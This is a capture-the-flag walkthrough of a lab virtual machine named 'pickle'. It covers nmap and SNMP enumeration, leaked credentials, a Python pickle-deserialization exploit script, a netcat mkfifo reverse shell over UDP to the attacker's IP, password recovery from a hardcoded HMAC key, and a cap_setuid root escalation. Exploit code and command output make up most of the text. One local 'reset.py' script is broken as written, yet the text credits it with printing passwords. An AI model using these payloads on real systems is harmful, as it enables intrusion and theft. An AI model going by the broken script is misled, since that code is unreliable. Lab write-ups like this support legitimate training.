
    # nmap -p1-65535 -sC -sV 192.168.0.44

    Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-12 12:31 CEST
    Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
    Service scan Timing: About 50.00% done; ETC: 12:31 (0:00:06 remaining)
    Nmap scan report for 192.168.0.44
    Host is up (0.00057s latency).
    PORT STATE SERVICE VERSION
    21/tcp open ftp vsftpd 3.0.3
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    |\_-rwxr-xr-x 1 0 0 1197 Oct 11 14:35 init.py.bak
    | ftp-syst:
    | STAT:
    | FTP server status:
    | Connected to ::ffff:192.168.0.17
    | Logged in as ftp
    | TYPE: ASCII
    | No session bandwidth limit
    | Session timeout in seconds is 300
    | Control connection is plain text
    | Data connections will be plain text
    | At session startup, client count was 2
    | vsFTPd 3.0.3 - secure, fast, stable
    |\_End of status
    1337/tcp open http Werkzeug httpd 1.0.1 (Python 2.7.16)
    | http-auth:
    | HTTP/1.0 401 UNAUTHORIZED\x0D
    |\_ Basic realm=Pickle login
    |\_http-server-header: Werkzeug/1.0.1 Python/2.7.16
    |\_http-title: Site doesn&#39;t have a title (text/html; charset=utf-8).
    MAC Address: 08:00:27:2F:5D:59 (Oracle VirtualBox virtual NIC)
    Service Info: OS: Unix
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 8.19 seconds
    The scan shows us that there are 2 open port port 21 (FTP), and 1337 (Werkzeug HTTPd). Now let&#39;s analyze the UDP ports.

# nmap -sU -sC -sV 192.168.0.44

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-12 12:34 CEST

Nmap scan report for 192.168.0.44

Host is up (0.00096s latency).

PORT STATE SERVICE VERSION

161/udp open snmp SNMPv1 server; net-snmp SNMPv3 server (public)

| snmp-info:

| enterprise: net-snmp

| engineIDFormat: unknown

| engineIDData: 8ac2e5721551835f00000000

| snmpEngineBoots: 15

|\_ snmpEngineTime: 3m22s

| snmp-sysdescr: Linux pickle 4.19.0-11-amd64 #1 SMP Debian 4.19.146-1 (2020-09-17) x86\_64 |\_ System uptime: 3m22.59s (20259 timeticks)

MAC Address: 08:00:27:2F:5D:59 (Oracle VirtualBox virtual NIC)

Service Info: Host: pickle

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 2.04 seconds

The SNMP port was found which works in public, we will analyze this later and the same for the FTP.

FTP

We can see in the FTP server there is a file named &quot;init.py.bak&quot;, download it with the ftp command.

# ftp 192.168.0.44

Connected to 192.168.0.44.

220 (vsFTPd 3.0.3)

Name (192.168.0.44:root): anonymous

331 Please specify the password.

Password:

230 Login successful.

Remote system type is UNIX.

Using binary mode to transfer files.

ftp\&gt; ls

200 PORT command successful. Consider using PASV.

150 Here comes the directory listing.

-rwxr-xr-x 1 0 0 1197 Oct 11 14:35 init.py.bak

226 Directory send OK.

ftp\&gt; mget init.py.bak

mget init.py.bak? y

200 PORT command successful. Consider using PASV.

150 Opening BINARY mode data connection for init.py.bak (1197 bytes).

226 Transfer complete.

1197 bytes received in 0.02 secs (70.4226 kB/s)

This is probably an old backup file, when we open the file it probably looks like the Werkzeug server for port 1337, we will be interested in this for later.

from functools import wraps

from flask import \*

import hashlib

import socket

import base64

import pickle

import hmac

app = Flask(\_\_name\_\_, template\_folder=&quot;templates&quot;, static\_folder=&quot;/opt/project/static/&quot;)

@app.route(&#39;/&#39;, methods=[&quot;GET&quot;, &quot;POST&quot;])

def index\_page():

if request.method == &quot;POST&quot; and request.form[&quot;story&quot;] and request.form[&quot;submit&quot;]:

md5\_encode = hashlib.md5(request.form[&quot;story&quot;]).hexdigest()

paths\_page = &quot;/opt/project/uploads/%s.log&quot; %(md5\_encode)

write\_page = open(paths\_page, &quot;w&quot;)

write\_page.write(request.form[&quot;story&quot;])

return &quot;The message was sent successfully!&quot;

return render\_template(&quot;index.html&quot;)

@app.route(&#39;/reset&#39;, methods=[&quot;GET&quot;, &quot;POST&quot;])

def reset\_page():

pass

@app.route(&#39;/checklist&#39;, methods=[&quot;GET&quot;, &quot;POST&quot;])

def check\_page():

if request.method == &quot;POST&quot; and request.form[&quot;check&quot;]:

path\_page = &quot;/opt/project/uploads/%s.log&quot; %(request.form[&quot;check&quot;])

open\_page = open(path\_page, &quot;rb&quot;).read()

if &quot;p1&quot; in open\_page:

open\_page = pickle.loads(open\_page)

return str(open\_page)

else:

return open\_page

else:

return &quot;Server Error!&quot;

return render\_template(&quot;checklist.html&quot;)

if \_\_name\_\_ == &#39;\_\_main\_\_&#39;:

app.run(host=&#39;0.0.0.0&#39;, port=1337, debug=True)

Werkzeug HTTPd

When I open my browser to view the site, it asks for a username and password. I tried the default credentials but it didn&#39;t work.

![](RackMultipart20201021-4-19b9uex_html_3594f6a900914bdf.png)

SNMP

SNMP can be publicly accessible, so let&#39;s use the snmpwalk command to find out more about this service. If you don&#39;t know what SNMP is, don&#39;t hesitate to check Google. To put it simply, it is simply a protocol that manages network equipment to monitor and diagnose network and hardware problems remotely.

# snmpwalk -c public -v 1 192.168.0.44|head -n 15

Bad operator (INTEGER): At line 73 in /usr/share/snmp/mibs/ietf/SNMPv2-PDU

SNMPv2-MIB::sysDescr.0 = STRING: Linux pickle 4.19.0-11-amd64 #1 SMP Debian 4.19.146-1 (2020-09-17) x86\_64

SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-TC::linux

DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (96182) 0:16:01.82

SNMPv2-MIB::sysContact.0 = STRING: lucas:SuperSecretPassword123! # \&lt;\&lt;\&lt;\&lt;\&lt;\&lt;\&lt;\&lt;\&lt;\&lt;

SNMPv2-MIB::sysName.0 = STRING: pickle

SNMPv2-MIB::sysLocation.0 = STRING: Sitting on the Dock of the Bay

SNMPv2-MIB::sysServices.0 = INTEGER: 72

SNMPv2-MIB::sysORLastChange.0 = Timeticks: (45) 0:00:00.45

SNMPv2-MIB::sysORID.1 = OID: SNMP-MPD-MIB::snmpMPDCompliance

SNMPv2-MIB::sysORID.2 = OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance

SNMPv2-MIB::sysORID.3 = OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance

SNMPv2-MIB::sysORID.4 = OID: SNMPv2-MIB::snmpMIB

SNMPv2-MIB::sysORID.5 = OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup

SNMPv2-MIB::sysORID.6 = OID: TCP-MIB::tcpMIB

SNMPv2-MIB::sysORID.7 = OID: IP-MIB::ip

We have found the crendential, we can connect to the Werkzeug service. The python script in the FTP server will allow us to continue our journey in this boxing.

Warkzeug HTTPd

There are only 3 sections, HOME , CHECK and RESET . The CHECK and RESET sections only return &quot;Server Error!&quot;

The paths are also in the Python code. But there is only /checklist and the ( / ). It is missing /reset because it is probably a backup file and it is not the main file. We can see the path redirects in the Python code.

@app.route(&#39;/&#39;, methods=[&quot;GET&quot;, &quot;POST&quot;])

[...SNIP...]

@app.route(&#39;/checklist&#39;, methods=[&quot;GET&quot;, &quot;POST&quot;])

If we take a closer look at the index\_page() function, it performs actions if we try to send a message to the Werkzeug server.

@app.route(&#39;/&#39;, methods=[&quot;GET&quot;, &quot;POST&quot;])

def index\_page():

if request.method == &quot;POST&quot; and request.form[&quot;story&quot;] and request.form[&quot;submit&quot;]:

md5\_encode = hashlib.md5(request.form[&quot;story&quot;]).hexdigest()

paths\_page = &quot;/opt/project/uploads/%s.log&quot; %(md5\_encode)

write\_page = open(paths\_page, &quot;w&quot;)

write\_page.write(request.form[&quot;story&quot;])

return &quot;The message was sent successfully!&quot;

First, there is a condition that tests if this is the correct method (POST) and also tests if the [story] and [submit] parameter exist. The [story] parameter corresponds to the message we send. if request.method == &quot;POST&quot; and request.form[&quot;story&quot;] and request.form[&quot;submit&quot;]

So concretely it encrypts the message we send in MD5 and it puts it in a variable named md5\_encode.

md5\_encode = hashlib.md5(request.form[&quot;story&quot;]).hexdigest()

Here, in concrete terms, it retrieves our message, encrypts it in MD5, and will create a file with the MD5.

paths\_page = &quot;/opt/project/uploads/%s.log&quot; %(md5\_encode)

Here we can see that the code will create a file in the uploads/ folder and it will write our message to the file.

write\_page = open(paths\_page, &quot;w&quot;)

write\_page.write(request.form[&quot;story&quot;])

We will now study the check\_page() function. First, we can observe that the condition tests the method if it is in POST and also tests if the check parameter exists.

if request.method == &quot;POST&quot; and request.form[&quot;check&quot;]

Here it seems to point to an MD5 file in the uploads/ folder. It will probably try to open this file.

path\_page = &quot;/opt/project/uploads/%s.log&quot; %(request.form[&quot;check&quot;])

If we enter the encrypted MD5 file, we can open it with the check parameter.

open\_page = open(path\_page, &quot;rb&quot;).read()

pickle will pickle each of these pieces separately, and then on unpickling, will call the callable on the provided arguments to construct the new object. And so, we can construct a pickle that, when un-pickled, will execute command. (Good link here) open\_command = pickle.loads(open\_page)

Here it tests if there is p1 value in the file if there is not p1 value in the file, it will open the file.

if(&quot;p1&quot; in open\_command)

return str(open\_command)

else

return open\_page

# Exploitation

We have seen that the check\_page() function loads a file, and if we do some data deserialization we can execute a command. If you don&#39;t understand, read an article here.

We will first do a little serialization and file reading test to better understand the context. If for example I want to read the message I sent. I need to encrypt the message in MD5 first, let&#39;s use Python for that.

\&gt;\&gt;\&gt; import hashlib

\&gt;\&gt;\&gt; message = &quot;hello&quot;

\&gt;\&gt;\&gt; print(hashlib.md5(message).hexdigest())

5d41402abc4b2a76b9719d911017c592

If now in the text field I write &quot;hello&quot; and now try to use the /checklist function, I can perfectly read my message which saved in the remote server.

curl -u &#39;lucas:SuperSecretPassword123!&#39; &#39;http://192.168.0.44:1337/checklist&#39; -d &quot;check=5d41402abc4b2a76b9719d911017c592&quot;

hello

Now we need to test with serialization to run commands. We need to create a Python script for this, get your keyboards ready.

#coding:utf-8

import os

import cPickle

import hashlib

import requests

class CommandExecute(object):

def \_\_reduce\_\_(self):

return (os.system, (&#39;ping -c 2 192.168.0.17&#39;,))

convert\_data = cPickle.dumps(CommandExecute()) # The message that will be sent to the server with the command.

convert\_crypt = hashlib.md5(convert\_data).hexdigest()

send\_requests = requests.post(&#39;http://192.168.0.44:1337/&#39;, data={&quot;story&quot;:convert\_data, &quot;submit&quot;:&quot;Submit+Query&quot;}, auth=(&quot;lucas&quot;, &quot;SuperSecretPassword123!&quot;))

check\_requests = requests.post(&#39;http://192.168.0.44:1337/checklist&#39;, data={&quot;check&quot;:convert\_crypt}, auth=(&quot;lucas&quot;, &quot;SuperSecretPassword123!&quot;))

print(check\_requests.text)

When we run the script, the server returns ICMP queries to us, so the command was successfully executed by the server. We are on the right track.

# tcpdump -i wlan0 icmp -n

tcpdump: verbose output suppressed, use -v or -vv for full protocol decode

listening on wlan0, link-type EN10MB (Ethernet), capture size 262144 bytes

14:03:53.499955 IP 192.168.0.44 \&gt; 192.168.0.17: ICMP echo request, id 492, seq 1, length 64

14:03:53.500017 IP 192.168.0.17 \&gt; 192.168.0.44: ICMP echo reply, id 492, seq 1, length 64

14:03:54.528969 IP 192.168.0.44 \&gt; 192.168.0.17: ICMP echo request, id 492, seq 2, length 64

14:03:54.529072 IP 192.168.0.17 \&gt; 192.168.0.44: ICMP echo reply, id 492, seq 2, length 64

14:03:55.553021 IP 192.168.0.44 \&gt; 192.168.0.17: ICMP echo request, id 492, seq 3, length 64

14:03:55.553110 IP 192.168.0.17 \&gt; 192.168.0.44: ICMP echo reply, id 492, seq 3, length 64

14:03:56.577171 IP 192.168.0.44 \&gt; 192.168.0.17: ICMP echo request, id 492, seq 4, length 64

14:03:56.577245 IP 192.168.0.17 \&gt; 192.168.0.44: ICMP echo reply, id 492, seq 4, length 64

14:03:57.578394 IP 192.168.0.44 \&gt; 192.168.0.17: ICMP echo request, id 492, seq 5, length 64

14:03:57.578461 IP 192.168.0.17 \&gt; 192.168.0.44: ICMP echo reply, id 492, seq 5, length 64

Reverse Shell

Let&#39;s change the script to do a reverse shell. I will be using a pentestmonkey command to do my reverse shell.

return (os.system, (&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\&gt;&amp;1|nc 192.168.0.17 9001 \&gt;/tmp/f&#39;,))

I tried the above command, and also tried other command like wget, but it didn&#39;t work, it doesn&#39;t accept TCP connections just 21 and 1337. I had to change the communication mode by doing a UDP reverse shell. I only added the -u option to specify that it is UDP mode. return (os.system, (&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\&gt;&amp;1|nc -u 192.168.0.17 9001 \&gt;/tmp/f&#39;,))

Now we have to use the netcat command to listen to a port and especially not to forget the -u option to specify the UDP protocol. And if now, I run the script, the server returns a shell to me.

# nc -u -lvnp 9001

nc: listening on :: 9001 ...

nc: listening on 0.0.0.0 9001 ...

nc: connect to 0.0.0.0 9001 from 192.168.0.44 53808

/bin/sh: 0: can&#39;t access tty; job control turned off

$ python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;

lucas@pickle:~$ whoami

lucas

I have used a lot of enumeration script, but it gives me nothing at all. I checked the file /opt/project/project.py and there is a new interesting function.

@app.route(&#39;/reset&#39;, methods=[&quot;GET&quot;, &quot;POST&quot;])

@requires\_auth

def reset\_page():

if request.method == &quot;POST&quot; and request.form[&quot;username&quot;] and request.form[&quot;key&quot;]:

key = &quot;dpff43f3p214k31301&quot;

raw = request.form[&quot;username&quot;] + key + socket.gethostbyname(socket.gethostname())

hashed = hmac.new(key, raw, hashlib.sha1)

if request.form[&quot;key&quot;] == hashed.hexdigest():

return base64.b64encode(hashed.digest().encode(&quot;base64&quot;).rstrip(&quot;\n&quot;))

else:

return &quot;Server Error!&quot;

We can see that there is a condition which tests if the method is POST and also tests if the username and key parameter exists.

if request.method == &quot;POST&quot; and request.form[&quot;username&quot;] and request.form[&quot;key&quot;]

Then there is a key.

key = &quot;dpff43f3p214k31301&quot;

Then concretely, it gets the user argument and merges it with the key and with the local IP address.

raw = request.form[&quot;username&quot;] + key + socket.gethostbyname(socket.gethostname())

Then the script encrypts the raw variable with the key key which is stored in the hashed variable.

hashed = hmac.new(key, raw, hashlib.sha1)

Then it tests if the key argument is equal to the variable hashed in hex .

if request.form[&quot;key&quot;] == hashed.hexdigest()

If the key is equal it encodes this in base64, we can probably recover the password for user mark and lucas. return base64.b64encode(hashed.digest().encode(&quot;base64&quot;).rstrip(&quot;\n&quot;)

We need to do local testing to better understand the system. I completely copy the function and paste this into my python file.

import hashlib

import requests

import socket

import base64

import hmac

key = &quot;dpff43f3p214k31301&quot;

raw = user[&quot;lucas&quot;] + key + socket.gethostbyname(socket.gethostname())

hashed = hmac.new(key, raw, hashlib.sha1)

if(key[hashed.hexdigest()] == hashed):

print(base64.b64encode(hashed.digest().encode(&quot;base64&quot;).rstrip(&quot;\n&quot;)))

And if we run we see that we have lucas password.

root@0xEEX75:~/hackmyvm/pickle# python reset.py

YTdYYTB1cDFQOTBmeEFwclVXZVBpTCtmakx3PQ== # Luca&#39;s password

Let&#39;s see if there is any user other than lucas in the target system.

lucas@pickle:/opt/project$ ls /home

lucas mark

There is indeed mark, let&#39;s try with mark to get the password.

import hashlib

import requests

import socket

import base64

import hmac

key = &quot;dpff43f3p214k31301&quot;

raw = user[&quot;mark&quot;] + key + socket.gethostbyname(socket.gethostname())

hashed = hmac.new(key, raw, hashlib.sha1)

if(key[hashed.hexdigest()] == hashed):

print(base64.b64encode(hashed.digest().encode(&quot;base64&quot;).rstrip(&quot;\n&quot;)))

And if we run we see that we have mark password.

# python reset.py

SUk5enROY2FnUWxnV1BUWFJNNXh4amxhc00wPQ== # Mark&#39;s password

lucas@pickle:/opt/project$ su - mark

Password: SUk5enROY2FnUWxnV1BUWFJNNXh4amxhc00wPQ==

mark@pickle:~$ cat user.txt

e25fd1[...SNIP...]

Mark \&gt; Root

Root is not very complicated, just look for files that support the capabilities.

mark@pickle:~$ getcap -r / 2\&gt;/dev/null

/home/mark/python2 = cap\_setuid+ep

/usr/bin/ping = cap\_net\_raw+ep

You just need to run python and use the os module to run a command.

    mark@pickle:~$ /home/mark/python2

/home/mark/python2

Python 2.7.16 (default, Oct 10 2019, 22:02:15)

[GCC 8.3.0] on linux2

Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.

\&gt;\&gt;\&gt; import os

\&gt;\&gt;\&gt; os.setuid(0)

\&gt;\&gt;\&gt; os.system(&#39;cat /root/root.txt&#39;)

os.system(&#39;cat /root/root.txt&#39;)

7a32c9739cc63ed983ae01af2577c01c
